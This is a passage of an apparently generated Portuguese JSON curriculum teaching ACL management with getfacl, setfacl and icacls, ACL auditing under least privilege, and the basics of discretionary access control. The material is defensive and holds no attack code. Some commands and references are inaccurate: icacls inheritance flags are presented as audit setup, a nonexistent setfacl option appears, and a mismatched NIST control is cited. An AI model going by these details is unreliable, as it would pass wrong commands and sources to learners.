                                "Programação em Shell: Automatizar ACLs via scripts bash.",
                                "Cibersegurança: Combina com auditoria (auditd) e princípios least privilege.",
                                "Gerenciamento de Arquivos: Extensões em ZFS/Btrfs quotas."
                              ],
                              "realWorldApplication": "Em ambientes empresariais multiusuário como servidores web ou repositórios Git compartilhados, ACLs permitem controle fino de acesso sem alterar grupos POSIX, garantindo conformidade com regulamentações como GDPR/SOX ao restringir dados sensíveis por usuário individual."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.3.2.2"
                            ]
                          },
                          {
                            "id": "10.1.6.3.3.2",
                            "name": "Gerenciar ACLs no Windows com icacls",
                            "description": "Aplicar comandos icacls e cacls para modificar ACLs em NTFS, incluindo remoção de permissões e auditoria de acessos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender fundamentos de ACLs e sintaxe do icacls",
                                  "subSteps": [
                                    "Estude o conceito de ACLs em NTFS: listas que definem permissões para usuários e grupos.",
                                    "Abra o Prompt de Comando como Administrador.",
                                    "Execute 'icacls /?' para visualizar a sintaxe completa.",
                                    "Compare icacls com cacls: icacls é mais moderno e suporta permissões avançadas.",
                                    "Identifique parâmetros chave: /grant, /deny, /remove, /save, /restore."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito 3 diferenças entre icacls e cacls, e liste 5 parâmetros principais.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Computador com Windows 10/11 (NTFS ativado)",
                                    "Prompt de Comando (run as admin)"
                                  ],
                                  "tips": "Sempre execute como Administrador para evitar erros de permissão.",
                                  "learningObjective": "Entender a estrutura de ACLs e dominar a sintaxe básica do icacls.",
                                  "commonMistakes": [
                                    "Executar sem privilégios de admin",
                                    "Confundir icacls com cacls obsoleto",
                                    "Ignorar herança de permissões"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Visualizar e fazer backup de ACLs existentes",
                                  "subSteps": [
                                    "Crie uma pasta de teste: mkdir C:\\TestACL.",
                                    "Execute 'icacls C:\\TestACL' para listar ACLs atuais.",
                                    "Faça backup: 'icacls C:\\TestACL /save C:\\backup_acl.txt'.",
                                    "Analise o arquivo de backup para entender o formato.",
                                    "Use 'icacls C:\\TestACL /verify' para checar integridade."
                                  ],
                                  "verification": "Confirme que o backup foi criado e visualize o conteúdo sem erros.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Pasta de teste em C:\\",
                                    "Arquivo de texto para backup"
                                  ],
                                  "tips": "Use pastas em C:\\ para evitar issues com caminhos longos.",
                                  "learningObjective": "Saber inspecionar e preservar ACLs antes de modificações.",
                                  "commonMistakes": [
                                    "Não especificar caminho completo",
                                    "Backup em local sem permissão",
                                    "Ignorar propagação (/T)"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Modificar ACLs: conceder, negar e remover permissões",
                                  "subSteps": [
                                    "Conceda permissão: 'icacls C:\\TestACL /grant Usuarios:(R)' para leitura.",
                                    "Negue acesso: 'icacls C:\\TestACL /deny Visitante:(F) /T' para full control.",
                                    "Remova permissão: 'icacls C:\\TestACL /remove Usuarios'.",
                                    "Propague para subpastas: use /T em comandos.",
                                    "Teste logins com contas diferentes para validar."
                                  ],
                                  "verification": "Liste ACLs alteradas com 'icacls C:\\TestACL' e confirme mudanças.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Contas de usuário de teste (Usuarios, Visitante)",
                                    "Pasta TestACL"
                                  ],
                                  "tips": "Use parênteses para permissões específicas: (R) leitura, (F) full.",
                                  "learningObjective": "Aplicar comandos para alterar permissões de forma precisa.",
                                  "commonMistakes": [
                                    "Esquecer /T para subitens",
                                    "Confundir grant/deny ordem",
                                    "Não testar com contas reais"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Restaurar ACLs, auditar e limpar",
                                  "subSteps": [
                                    "Restaure do backup: 'icacls C:\\TestACL /restore C:\\backup_acl.txt'.",
                                    "Configure auditoria: 'icacls C:\\TestACL /inheritance:d' para desabilitar herança.",
                                    "Visualize eventos no Visualizador de Eventos (Security log).",
                                    "Limpe pasta: rmdir /s C:\\TestACL.",
                                    "Documente lições aprendidas em um arquivo."
                                  ],
                                  "verification": "Confirme que ACLs foram restauradas corretamente via listagem.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Arquivo de backup",
                                    "Visualizador de Eventos"
                                  ],
                                  "tips": "Auditoria requer políticas de grupo ativadas para logs.",
                                  "learningObjective": "Reverter mudanças e monitorar acessos para auditoria.",
                                  "commonMistakes": [
                                    "Restaurar sem /T",
                                    "Não ativar auditing no sistema",
                                    "Deletar backup prematuro"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma empresa, proteja a pasta C:\\DadosConfidenciais concedendo leitura apenas ao grupo 'Auditores' ('icacls /grant Auditores:(R) /T'), negando ao 'Vendas' ('/deny Vendas:(F)'), faça backup antes e restaure se necessário.",
                              "finalVerifications": [
                                "Executar icacls em pasta com output correto sem erros de sintaxe.",
                                "Modificar ACLs e verificar negação de acesso com login de teste.",
                                "Restaurar ACLs de backup com sucesso.",
                                "Identificar herança e propagação em listagens.",
                                "Explicar impacto de /deny vs /grant.",
                                "Auditar um acesso e localizar no log de eventos."
                              ],
                              "assessmentCriteria": [
                                "Precisão e correção de todos os comandos executados.",
                                "Compreensão demonstrada de herança e propagação (/T).",
                                "Uso correto de grant/deny/remove sem sobrescrita acidental.",
                                "Backup e restore funcionais.",
                                "Identificação de erros comuns e aplicação de tips.",
                                "Aplicação em cenário prático sem falhas de segurança."
                              ],
                              "crossCurricularConnections": [
                                "Administração de Redes: Integração com Active Directory.",
                                "Segurança da Informação: Conformidade com LGPD/GDPR.",
                                "Auditoria e Forense: Análise de logs de acesso.",
                                "Gerenciamento de Sistemas: Políticas de grupo e NTFS.",
                                "Desenvolvimento de Scripts: Automatização com PowerShell."
                              ],
                              "realWorldApplication": "Administradores de TI em empresas usam icacls para gerenciar permissões em servidores Windows, protegendo dados sensíveis, garantindo conformidade regulatória e respondendo a incidentes de segurança."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.3.2.2"
                            ]
                          },
                          {
                            "id": "10.1.6.3.3.3",
                            "name": "Auditar e mitigar vulnerabilidades em ACLs",
                            "description": "Identificar configurações inseguras em ACLs, como permissões excessivas, e aplicar princípios de menor privilégio para prevenção de escalada de privilégios.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Mapear e Documentar Configurações Atuais de ACLs",
                                  "subSteps": [
                                    "Identifique o sistema operacional ou ambiente (ex: Linux com ACLs POSIX, Windows NTFS).",
                                    "Colete configurações de ACLs usando comandos apropriados (ex: getfacl em Linux, icacls em Windows).",
                                    "Crie um inventário visual ou tabela de usuários/grupos, permissões e recursos protegidos.",
                                    "Documente herança de permissões e configurações padrão.",
                                    "Revise logs de acesso para padrões de uso."
                                  ],
                                  "verification": "Verifique se o inventário está completo comparando com lista de recursos críticos e sem erros de coleta.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Ferramentas de linha de comando (getfacl, icacls)",
                                    "Editor de texto ou planilha (Excel/Google Sheets)",
                                    "Documentação do SO"
                                  ],
                                  "tips": "Comece com recursos de alto risco como /etc/passwd ou diretórios de configuração.",
                                  "learningObjective": "Compreender a estrutura atual de ACLs para baseline de auditoria.",
                                  "commonMistakes": [
                                    "Ignorar herança de permissões de diretórios pai",
                                    "Não documentar usuários de serviço"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Auditar Vulnerabilidades em ACLs",
                                  "subSteps": [
                                    "Analise permissões excessivas (ex: world-writable files, todos com full control).",
                                    "Verifique violações de least privilege (ex: usuários não-admin com acesso root).",
                                    "Identifique riscos de escalada de privilégios (ex: SUID bits em executáveis).",
                                    "Use ferramentas automatizadas como Lynis ou ACL audit scripts para scan.",
                                    "Classifique vulnerabilidades por severidade (alta/média/baixa)."
                                  ],
                                  "verification": "Gere relatório com lista de vulnerabilidades encontradas e evidências (screenshots/comandos).",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "Ferramentas de auditoria (Lynis, custom scripts)",
                                    "Checklists de melhores práticas NIST/OWASP"
                                  ],
                                  "tips": "Priorize auditoria em paths críticos como /home, /var/www.",
                                  "learningObjective": "Detectar configurações inseguras que permitam escalada de privilégios.",
                                  "commonMistakes": [
                                    "Focar só em permissões de arquivos, ignorar shares de rede",
                                    "Não considerar contexto de aplicação"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Planejar e Aplicar Mitigações com Least Privilege",
                                  "subSteps": [
                                    "Defina princípios de least privilege: conceda apenas permissões necessárias.",
                                    "Redesenhe ACLs removendo excessos (ex: setfacl -m u:user:r file).",
                                    "Crie grupos lógicos para gerenciar permissões em escala.",
                                    "Teste mudanças em ambiente de staging para evitar downtime.",
                                    "Prepare rollback plan caso de falhas."
                                  ],
                                  "verification": "Simule acessos com contas de teste para confirmar permissões corretas.",
                                  "estimatedTime": "2-4 horas",
                                  "materials": [
                                    "Comandos setfacl/icacls",
                                    "Ambiente de teste virtual (VMware/VirtualBox)"
                                  ],
                                  "tips": "Use 'setfacl -m d:u:user:r:: dir' para herança padrão.",
                                  "learningObjective": "Aplicar princípios de segurança para endurecer ACLs.",
                                  "commonMistakes": [
                                    "Remover permissões essenciais quebrando apps",
                                    "Não testar após mudanças"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Verificar, Testar e Documentar Mudanças",
                                  "subSteps": [
                                    "Re-audite ACLs pós-mitigação com mesmas ferramentas do Step 1 e 2.",
                                    "Teste cenários de escalada de privilégios (ex: tentar sudo sem auth).",
                                    "Monitore logs por denegations inesperadas.",
                                    "Atualize documentação com novas ACLs e políticas.",
                                    "Configure alertas para mudanças futuras em ACLs."
                                  ],
                                  "verification": "Confirme zero vulnerabilidades críticas remanescentes via relatório final.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Logs do sistema (/var/log/audit)",
                                    "Ferramentas de monitoramento (auditd)"
                                  ],
                                  "tips": "Automatize verificações com cron jobs.",
                                  "learningObjective": "Garantir eficácia das mitigações e sustentabilidade.",
                                  "commonMistakes": [
                                    "Pular testes reais de exploit",
                                    "Não documentar para equipe"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um servidor Linux web, execute 'getfacl /var/www/html' e descubra que 'apache:apache' tem rwx em arquivos sensíveis. Identifique risco de escalada via upload malicioso. Aplique 'setfacl -m u:apache:rx /var/www/html' e teste negando escrita, prevenindo exploits como LFI.",
                              "finalVerifications": [
                                "Todas permissões seguem least privilege sem excessos.",
                                "Testes de escalada de privilégios falham como esperado.",
                                "Logs mostram apenas acessos autorizados.",
                                "Relatório de re-auditoria é limpo.",
                                "Documentação atualizada e compartilhada.",
                                "Alertas configurados para monitoramento contínuo."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de 100% das vulnerabilidades simuladas.",
                                "Aplicação correta de comandos ACL sem erros sintáticos.",
                                "Relatórios claros com evidências e raciocínio.",
                                "Tempo de mitigação dentro do estimado sem downtime.",
                                "Compreensão demonstrada em quiz sobre least privilege.",
                                "Capacidade de explicar riscos em entrevista simulada."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Integração com firewalls e ACLs de rede (iptables).",
                                "Programação: Scripts Python/Bash para auditoria automatizada.",
                                "Gestão de TI: Conformidade com GDPR/HIPAA via controle de acesso.",
                                "Ética: Discussão de impactos de breaches em privacidade.",
                                "Análise de Dados: Uso de logs para detecção de anomalias."
                              ],
                              "realWorldApplication": "Em organizações como bancos ou hospitais, auditar ACLs previne breaches como o SolarWinds, onde escalada de privilégios permitiu acesso a dados sensíveis, economizando milhões em multas e recuperação."
                            },
                            "estimatedTime": "2.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.3.3.1",
                              "10.1.6.3.3.2"
                            ]
                          },
                          {
                            "id": "10.1.6.3.3.4",
                            "name": "Simular cenários de autorização com ACLs",
                            "description": "Criar exercícios práticos para testar resolução de acessos em ACLs complexas, considerando propagação e conflitos de permissões.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar ambiente de simulação de ACLs",
                                  "subSteps": [
                                    "Instale um sistema operacional com suporte a ACLs, como Linux com NFSv4 ACLs ou Windows com NTFS.",
                                    "Crie usuários e grupos de teste usando comandos como useradd e groupadd.",
                                    "Configure um diretório de teste com ACLs básicas usando setfacl/getfacl.",
                                    "Teste permissões básicas para validar o ambiente.",
                                    "Documente a configuração inicial em um arquivo de log."
                                  ],
                                  "verification": "Execute getfacl em um diretório de teste e confirme que ACLs são exibidas corretamente sem erros.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "Máquina virtual Linux/Windows",
                                    "Comandos setfacl/getfacl/icacls",
                                    "Documentação oficial de ACLs do SO"
                                  ],
                                  "tips": "Use uma VM isolada para evitar impactos em sistemas reais; comece com ACLs POSIX para simplicidade.",
                                  "learningObjective": "Configurar um ambiente funcional para simular ACLs, entendendo comandos essenciais de configuração.",
                                  "commonMistakes": [
                                    "Esquecer de ativar suporte a ACLs no kernel (ex: mount -o acl)",
                                    "Confundir permissões POSIX com ACLs avançadas",
                                    "Não criar usuários/grupos antes de aplicar ACLs"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Projetar cenários complexos com propagação e conflitos",
                                  "subSteps": [
                                    "Defina hierarquia de diretórios com herança de permissões (ex: /projeto/subprojeto).",
                                    "Aplique ACLs com propagação: allow/deny em pastas pai que se propagam para filhos.",
                                    "Introduza conflitos: regras deny explícitas que sobrepõem allows herdados.",
                                    "Crie múltiplos usuários/grupos e atribua papéis variados (admin, user, guest).",
                                    "Esboce fluxogramas de cenários em papel ou ferramenta como Draw.io."
                                  ],
                                  "verification": "Revise o fluxograma e liste 3 cenários com conflitos identificados explicitamente.",
                                  "estimatedTime": "30-45 minutos",
                                  "materials": [
                                    "Editor de texto ou Draw.io",
                                    "Lista de usuários/grupos criados no Step 1",
                                    "Referência de regras de propagação ACL"
                                  ],
                                  "tips": "Lembre-se: deny sempre prevalece sobre allow; teste herança com --set-child para controle fino.",
                                  "learningObjective": "Projetar cenários realistas que incorporem propagação de permissões e conflitos prioritários.",
                                  "commonMistakes": [
                                    "Ignorar ordem de avaliação (deny first)",
                                    "Não considerar máscaras de ACL que limitam permissões",
                                    "Esquecer propagação seletiva para subdiretórios"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Executar simulações de autorização em cenários",
                                  "subSteps": [
                                    "Aplique as ACLs projetadas usando setfacl com opções de propagação e deny.",
                                    "Simule acessos: tente ls, cd, rm como diferentes usuários via su ou sudo -u.",
                                    "Registre resultados reais vs. esperados em uma tabela (usuário, ação, resultado, motivo).",
                                    "Repita para todos cenários, ajustando ACLs se necessário para induzir conflitos.",
                                    "Capture saídas de erro com strace ou logs de auditoria."
                                  ],
                                  "verification": "Tabela preenchida com pelo menos 10 tentativas de acesso, mostrando resoluções corretas de conflitos.",
                                  "estimatedTime": "45-60 minutos",
                                  "materials": [
                                    "Ambiente do Step 1",
                                    "Tabela em Markdown/Excel",
                                    "Comandos su/sudo para impersonação"
                                  ],
                                  "tips": "Use --mask para visualizar permissões efetivas; grave sessões com script para replay.",
                                  "learningObjective": "Executar testes práticos de autorização, interpretando resultados de ACLs complexas.",
                                  "commonMistakes": [
                                    "Não usar usuário correto (sudo root ignora ACLs)",
                                    "Confundir falha de permissão com erro de caminho",
                                    "Ignorar permissões efetivas vs. declaradas"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar resultados e depurar conflitos",
                                  "subSteps": [
                                    "Compare resultados simulados com regras de propagação documentadas.",
                                    "Identifique e resolva conflitos: ajuste ACLs para alinhar com intenções de segurança.",
                                    "Gere relatório com lições aprendidas e recomendações de melhores práticas.",
                                    "Teste correções finais com acessos repetidos.",
                                    "Compartilhe relatório em formato legível (PDF/MD)."
                                  ],
                                  "verification": "Relatório completo com análises de 3+ cenários resolvidos e testes de validação passing.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "Tabela do Step 3",
                                    "Editor para relatório",
                                    "Ferramentas de diff para comparar ACLs antes/depois"
                                  ],
                                  "tips": "Priorize princípio de menor privilégio; use getfacl -e para exportar/importar ACLs em testes.",
                                  "learningObjective": "Analisar e depurar simulações de ACLs, aplicando princípios de segurança.",
                                  "commonMistakes": [
                                    "Não documentar motivos de conflitos",
                                    "Aplicar mudanças sem backup de ACLs originais",
                                    "Subestimar impacto de herança recursiva"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um servidor de desenvolvimento, crie /projeto/confidencial com ACL allow para grupo devs herdado, mas adicione deny explícito para user_alice em subpasta /relatorios. Simule: alice tenta cat relatorios/segredo.txt → deve falhar apesar de herança, demonstrando deny prevalece.",
                              "finalVerifications": [
                                "Simular com sucesso 5 cenários complexos sem erros de configuração.",
                                "Explicar verbalmente como propagação afeta 3 acessos específicos.",
                                "Gerar relatório com depuração de conflitos resolvidos.",
                                "Aplicar ACLs corretas em ambiente novo sem consulta.",
                                "Identificar e corrigir 2 erros comuns em ACLs de exemplo.",
                                "Demonstrar uso de ferramentas getfacl/setfacl em tempo real."
                              ],
                              "assessmentCriteria": [
                                "Precisão na resolução de acessos (100% match com regras esperadas).",
                                "Profundidade na análise de conflitos e propagação.",
                                "Qualidade do relatório: claro, completo e acionável.",
                                "Eficiência no uso de tempo e recursos.",
                                "Criatividade nos cenários projetados (relevância realista).",
                                "Adesão a melhores práticas de segurança (least privilege)."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Integração de ACLs com firewalls e NAC (Network Access Control).",
                                "Programação: Implementação de ACLs em APIs como AWS IAM ou código Python com libraries.",
                                "Administração de Sistemas: Auditoria de logs em SIEM tools.",
                                "Ética e Governança: Conformidade com GDPR/SOX via controle de acessos.",
                                "Banco de Dados: ACLs em RDBMS como PostgreSQL row-level security."
                              ],
                              "realWorldApplication": "Administradores de TI usam simulações de ACLs para auditar acessos em servidores corporativos antes de migrações, prevenindo vazamentos de dados em ambientes com milhares de usuários e hierarquias de pastas compartilhadas."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.3.3.3"
                            ]
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.6.4",
                    "name": "Controle de Acesso Discrecional (DAC)",
                    "description": "Modelo onde o proprietário do recurso decide as permissões de acesso.",
                    "individualConcepts": [
                      {
                        "id": "10.1.6.4.1",
                        "name": "Definição e Princípios do DAC",
                        "description": "Entender os fundamentos do Controle de Acesso Discrecional (DAC), onde o proprietário do recurso define as permissões de acesso para usuários ou processos.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.4.1.1",
                            "name": "Definir DAC e seus princípios básicos",
                            "description": "Explicar o modelo DAC como um mecanismo de segurança onde o criador ou proprietário de um objeto (arquivo, processo) concede permissões específicas de leitura, escrita e execução a sujeitos (usuários ou grupos).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Conceitos Fundamentais de Controle de Acesso",
                                  "subSteps": [
                                    "Estude a diferença entre autenticação (quem você é) e autorização (o que você pode fazer).",
                                    "Identifique os tipos básicos de controles de acesso: Discrecional (DAC), Mandatório (MAC) e Baseado em Papéis (RBAC).",
                                    "Revise exemplos simples de permissões em sistemas cotidianos, como bloqueio de tela ou senhas de Wi-Fi.",
                                    "Anote definições chave: sujeito (usuário/grupo), objeto (arquivo/processo) e operação (ler/escrever/executar).",
                                    "Compare controle de acesso com fechaduras físicas em uma casa."
                                  ],
                                  "verification": "Escreva um parágrafo resumindo autenticação vs. autorização e liste 3 tipos de controles de acesso.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documento introdutório de cibersegurança",
                                    "Vídeo sobre autenticação e autorização (ex: YouTube Khan Academy)"
                                  ],
                                  "tips": [
                                    "Use analogias reais para fixar conceitos.",
                                    "Crie um mapa mental ligando termos."
                                  ],
                                  "learningObjective": "Diferenciar conceitos básicos de segurança de acesso e identificar componentes essenciais.",
                                  "commonMistakes": [
                                    "Confundir autenticação com autorização.",
                                    "Ignorar a distinção entre sujeito e objeto."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Definir o Modelo DAC",
                                  "subSteps": [
                                    "Leia a definição oficial: DAC é um mecanismo onde o proprietário do objeto concede permissões específicas.",
                                    "Explique que 'discrecional' significa que o criador/proprietário decide quem acessa o quê.",
                                    "Estude como DAC usa listas de controle de acesso (ACL) para armazenar permissões.",
                                    "Identifique cenários onde DAC é aplicado: arquivos em SO como Linux/Windows.",
                                    "Registre a definição em suas palavras, incluindo exemplos de permissões (leitura, escrita, execução)."
                                  ],
                                  "verification": "Forneça uma definição de DAC em 2-3 frases claras e cite um exemplo de uso.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "NIST SP 800-53 sobre SC-07",
                                    "Página da Wikipedia sobre Discretionary Access Control"
                                  ],
                                  "tips": [
                                    "Foque no papel do 'proprietário' como ponto central.",
                                    "Evite jargões sem explicar."
                                  ],
                                  "learningObjective": "Formular uma definição precisa e concisa do DAC.",
                                  "commonMistakes": [
                                    "Descrever DAC como 'totalmente flexível' sem mencionar limitações.",
                                    "Confundir com permissões de grupo em sistemas modernos."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar os Componentes Principais do DAC",
                                  "subSteps": [
                                    "Descreva sujeitos: usuários individuais ou grupos que solicitam acesso.",
                                    "Explique objetos: recursos protegidos como arquivos, diretórios ou processos.",
                                    "Detalhe permissões básicas: Read (R), Write (W), Execute (X) e como são combinadas.",
                                    "Estude ACLs: estruturas que mapeiam sujeitos a permissões em objetos.",
                                    "Simule uma ACL simples para um arquivo: proprietário=full, grupo=read, outros=none.",
                                    "Discuta herança de permissões em hierarquias de diretórios."
                                  ],
                                  "verification": "Crie uma ACL fictícia para um arquivo sensível e explique cada entrada.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação Linux man chmod/chown",
                                    "Simulador online de permissões de arquivos"
                                  ],
                                  "tips": [
                                    "Use tabelas para visualizar ACLs.",
                                    "Teste comandos em uma VM segura."
                                  ],
                                  "learningObjective": "Identificar e descrever os componentes chave do DAC com exemplos práticos.",
                                  "commonMistakes": [
                                    "Omitir a distinção entre permissões efetivas e explícitas.",
                                    "Esquecer que negações podem sobrescrever permissões."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar os Princípios Básicos do DAC",
                                  "subSteps": [
                                    "Princípio 1: Proprietário tem controle total (criar, modificar, deletar ACLs).",
                                    "Princípio 2: Transferência de direitos: proprietário pode conceder permissões a outros.",
                                    "Princípio 3: Simplicidade e flexibilidade, mas risco de má configuração pelo usuário.",
                                    "Princípio 4: Não depende de classificações de segurança (diferente de MAC).",
                                    "Princípio 5: Suporte a delegação limitada (usuário concede o que possui).",
                                    "Compare brevemente com MAC para reforçar diferenças."
                                  ],
                                  "verification": "Liste 4 princípios do DAC com uma frase explicativa cada e um contraexemplo de MAC.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Artigo sobre modelos de controle de acesso (ex: SANS Institute)",
                                    "Quadro comparativo DAC vs MAC"
                                  ],
                                  "tips": [
                                    "Memorize com acrônimos: P-T-S (Proprietário, Transferência, Simplicidade).",
                                    "Pense em riscos para entender limitações."
                                  ],
                                  "learningObjective": "Articular os princípios fundamentais que definem o funcionamento do DAC.",
                                  "commonMistakes": [
                                    "Atribuir políticas centrais ao DAC (é descentralizado).",
                                    "Ignorar vulnerabilidades como escalada de privilégios."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um sistema Linux, crie um arquivo 'relatorio.confidencial' com chown para definir você como proprietário (chown usuario:grupo arquivo), chmod 640 para dar read/write ao proprietário e read ao grupo, negando ao outros. Teste acessos com su - outro_usuario para verificar: proprietário edita, grupo lê, outros falham.",
                              "finalVerifications": [
                                "Defina DAC corretamente incluindo proprietário e permissões.",
                                "Liste e explique R, W, X com exemplos.",
                                "Descreva uma ACL completa para um objeto.",
                                "Identifique 3 princípios básicos do DAC.",
                                "Diferencie DAC de MAC em um parágrafo.",
                                "Simule configuração de permissões em um cenário real."
                              ],
                              "assessmentCriteria": [
                                "Precisão e completude da definição de DAC (20%)",
                                "Correta descrição de componentes (sujeitos, objetos, ACLs) (25%)",
                                "Explicação clara dos princípios básicos (25%)",
                                "Uso de exemplos práticos e verificáveis (15%)",
                                "Diferenciação de outros modelos de controle (10%)",
                                "Clareza e estrutura na comunicação (5%)"
                              ],
                              "crossCurricularConnections": [
                                "Redes: Integração com firewalls e NAC (Network Access Control).",
                                "Programação: Gerenciamento de permissões em APIs e apps web (ex: OAuth).",
                                "Direito Digital: Conformidade com LGPD/GDPR em controles de acesso.",
                                "Administração de Sistemas: Configuração em cloud (AWS IAM como extensão).",
                                "Ética em TI: Riscos de má configuração e responsabilidade do proprietário."
                              ],
                              "realWorldApplication": "No ambiente corporativo, DAC protege arquivos sensíveis em servidores compartilhados (ex: NTFS no Windows ou ext4 no Linux), permitindo que gerentes concedam acesso read-only a relatórios financeiros para auditores, enquanto equipes de TI monitoram logs para detectar violações, prevenindo vazamentos de dados em conformidade com regulamentações como HIPAA ou PCI-DSS."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.4.1.2",
                            "name": "Identificar o papel do proprietário no DAC",
                            "description": "Descrever como o proprietário de um recurso tem autoridade total para definir, modificar ou revogar permissões, diferenciando de modelos centralizados como MAC.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os fundamentos do Controle de Acesso Discrecional (DAC)",
                                  "subSteps": [
                                    "Ler a definição oficial de DAC de fontes confiáveis como NIST ou documentação de SO.",
                                    "Identificar os elementos chave: sujeito, objeto e proprietário.",
                                    "Explicar o termo 'discrecional' em relação ao controle de acesso.",
                                    "Listar exemplos iniciais de recursos controlados (arquivos, pastas).",
                                    "Anotar a diferença básica entre controle local e centralizado."
                                  ],
                                  "verification": "Escrever um resumo de 3 frases definindo DAC e mencionando o proprietário.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação NIST SP 800-53 sobre SC-07",
                                    "Vídeo introdutório sobre DAC no YouTube (5-10 min)",
                                    "Notebook para anotações"
                                  ],
                                  "tips": "Use analogias cotidianas, como dono de uma casa decidindo quem entra.",
                                  "learningObjective": "Dominar a definição de DAC e introduzir o conceito de proprietário como entidade central.",
                                  "commonMistakes": [
                                    "Confundir DAC com permissões de grupo em vez de discricionariedade individual",
                                    "Ignorar que o proprietário é tipicamente o criador do recurso"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar as responsabilidades e autoridades do proprietário",
                                  "subSteps": [
                                    "Descrever as ações principais: definir permissões iniciais.",
                                    "Detalhar como modificar permissões existentes (ex: adicionar/revogar usuários).",
                                    "Explicar o direito de revogar acesso total, incluindo deleção do recurso.",
                                    "Simular em diagrama: proprietário -> ações -> permissões em objetos.",
                                    "Discutir limitações potenciais (ex: políticas de SO ou superusuário)."
                                  ],
                                  "verification": "Criar uma lista numerada das 3 principais autoridades do proprietário e exemplos para cada.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Ferramenta de diagrama como Draw.io",
                                    "Exemplos de comandos Unix chmod/chown",
                                    "Artigo sobre proprietários em Linux"
                                  ],
                                  "tips": "Lembre-se: o proprietário tem 'autoridade total' sobre seu recurso, como um rei em seu reino.",
                                  "learningObjective": "Identificar e detalhar as ações exclusivas do proprietário no DAC.",
                                  "commonMistakes": [
                                    "Achar que outros usuários podem alterar permissões sem delegação",
                                    "Confundir revogação com deleção permanente"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Diferenciar o DAC (proprietário) de modelos centralizados como MAC",
                                  "subSteps": [
                                    "Definir MAC: controle obrigatório baseado em labels de segurança centralizadas.",
                                    "Comparar: DAC (decisão local do proprietário) vs MAC (política global imposta).",
                                    "Listar prós e contras: flexibilidade no DAC vs rigidez no MAC.",
                                    "Analisar cenários: mudança de permissão em DAC é instantânea; em MAC requer aprovação.",
                                    "Criar tabela comparativa com colunas: DAC, MAC, Responsável."
                                  ],
                                  "verification": "Preencher uma tabela comparativa e explicar verbalmente uma diferença chave.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Tabela em Excel ou Google Sheets",
                                    "Comparação DAC vs MAC de sites como OWASP",
                                    "Vídeo sobre MAC (5 min)"
                                  ],
                                  "tips": "Pense em DAC como 'faça você mesmo' e MAC como 'governo decide'.",
                                  "learningObjective": "Distinguir claramente o papel descentralizado do proprietário no DAC do centralizado em MAC.",
                                  "commonMistakes": [
                                    "Misturar RBAC (baseado em roles) com MAC",
                                    "Subestimar a autoridade total do proprietário no DAC"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar o conceito em cenários práticos e verificar compreensão",
                                  "subSteps": [
                                    "Escolher um cenário real: proprietário de arquivo em Linux define acesso.",
                                    "Simular passos: criar arquivo, chown, chmod, testar acesso.",
                                    "Analisar erro comum: usuário tenta alterar sem ser proprietário.",
                                    "Discutir implicações de segurança: risco de proprietário malicioso.",
